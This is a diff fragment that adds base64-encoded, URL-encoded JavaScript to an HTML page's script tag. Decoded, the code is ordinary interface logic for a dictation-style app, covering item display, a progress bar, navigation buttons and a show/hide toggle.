+    +"JTJCJTJCZGljdGF0aW9uR2VuJTNCJTBBJTIwJTIwdXBkYXRlQnV0dG9ucyUyOCUyOSUzQiUwQSUyMCUy"
+    +"MHJ1bkxvb3AlMjhnZW4lMjklM0IlMEElN0QlMEElMEFmdW5jdGlvbiUyMHVwZGF0ZURpc3BsYXklMjhp"
+    +"bmRleCUyOSUyMCU3QiUwQSUyMCUyMGNvbnN0JTIwaXRlbSUyMCUzRCUyMGRpY3RhdGlvbkl0ZW1zJTVC"
+    +"aW5kZXglNUQlM0IlMEElMjAlMjBjb25zdCUyMGVsJTIwJTNEJTIwJTI0JTI4JTI3Y3VycmVudC1pdGVt"
+    +"JTI3JTI5JTNCJTBBJTIwJTIwZWwudGV4dENvbnRlbnQlMjAlM0QlMjBpdGVtJTNCJTBBJTIwJTIwY29u"
+    +"c3QlMjBoaWRkZW4lMjAlM0QlMjBlbC5kYXRhc2V0LmhpZGRlbiUyMCUzRCUzRCUzRCUyMCUyN3RydWUl"
+    +"MjclM0IlMEElMjAlMjBlbC5jbGFzc0xpc3QudG9nZ2xlJTI4JTI3aGlkZGVuLXRleHQlMjclMkMlMjBo"
+    +"aWRkZW4lMjklM0IlMEElMEElMjAlMjBjb25zdCUyMHRvdGFsJTIwJTNEJTIwZGljdGF0aW9uSXRlbXMu"
+    +"bGVuZ3RoJTNCJTBBJTIwJTIwJTI0JTI4JTI3cHJvZ3Jlc3MtdGV4dCUyNyUyOS50ZXh0Q29udGVudCUy"
+    +"MCUzRCUyMCU2MCUyNCU3QmluZGV4JTIwJTJCJTIwMSU3RCUyMCUyRiUyMCUyNCU3QnRvdGFsJTdEJTYw"
+    +"JTNCJTBBJTIwJTIwJTI0JTI4JTI3cHJvZ3Jlc3MtYmFyJTI3JTI5LnN0eWxlLndpZHRoJTIwJTNEJTIw"
+    +"JTI4JTI4aW5kZXglMjAlMkIlMjAxJTI5JTIwJTJGJTIwdG90YWwlMjAlMkElMjAxMDAlMjklMjAlMkIl"
+    +"MjAlMjclMjUlMjclM0IlMEElMjAlMjAlMjQlMjglMjdwcmV2LWJ0biUyNyUyOS5kaXNhYmxlZCUyMCUz"
+    +"RCUyMGluZGV4JTIwJTNEJTNEJTNEJTIwMCUzQiUwQSUyMCUyMCUyNCUyOCUyN25leHQtYnRuJTI3JTI5"
+    +"LmRpc2FibGVkJTIwJTNEJTIwaW5kZXglMjAlM0UlM0QlMjB0b3RhbCUyMC0lMjAxJTNCJTBBJTdEJTBB"
+    +"JTBBZnVuY3Rpb24lMjB0b2dnbGVSZXZlYWwlMjglMjklMjAlN0IlMEElMjAlMjBjb25zdCUyMGVsJTIw"
+    +"JTNEJTIwJTI0JTI4JTI3Y3VycmVudC1pdGVtJTI3JTI5JTNCJTBBJTIwJTIwY29uc3QlMjBoaWRkZW4l"
+    +"MjAlM0QlMjBlbC5kYXRhc2V0LmhpZGRlbiUyMCUzRCUzRCUzRCUyMCUyN3RydWUlMjclM0IlMEElMjAl"
+    +"MjBlbC5kYXRhc2V0LmhpZGRlbiUyMCUzRCUyMGhpZGRlbiUyMCUzRiUyMCUyN2ZhbHNlJTI3JTIwJTNB"
+    +"JTIwJTI3dHJ1ZSUyNyUzQiUwQSUyMCUyMGVsLmNsYXNzTGlzdC50b2dnbGUlMjglMjdoaWRkZW4tdGV4"
+    +"dCUyNyUyQyUyMCUyMWhpZGRlbiUyOSUzQiUwQSUyMCUyMCUyNCUyOCUyN3JldmVhbC1idG4lMjclMjku"
+    +"dGV4dENvbnRlbnQlMjAlM0QlMjBoaWRkZW4lMjAlM0YlMjB0JTI4JTI3YnRuSGlkZSUyNyUyOSUyMCUz"
+    +"QSUyMHQlMjglMjdidG5TaG93JTI3JTI5JTNCJTBBJTdEJTBBJTBB"
+)));</script>
 </body>
 </html>
